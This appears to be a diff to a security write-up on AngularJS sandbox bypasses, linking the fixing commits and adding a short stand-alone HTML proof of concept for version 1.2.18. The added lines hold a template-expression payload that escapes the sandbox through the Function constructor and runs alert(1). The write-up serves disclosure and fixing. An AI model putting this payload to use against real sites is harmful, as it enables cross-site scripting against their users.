@@ -511,3 +511,16 @@ falsy, meaning that AngularJS won't recognize (and block) attempts to access it 
 These are the commits that fix the issues: https://github.com/angular/angular.js/compare/2df721...2e6144
 
 This is the corresponding Changelog entry: https://github.com/angular/angular.js/commit/b3b501
+
+Shortened, stand-alone example:
+
+{{{
+<html ng-app>
+<head>
+    <meta charset="utf-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.18/angular.js"></script>
+</head>
+<body>
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+</body>
+}}}
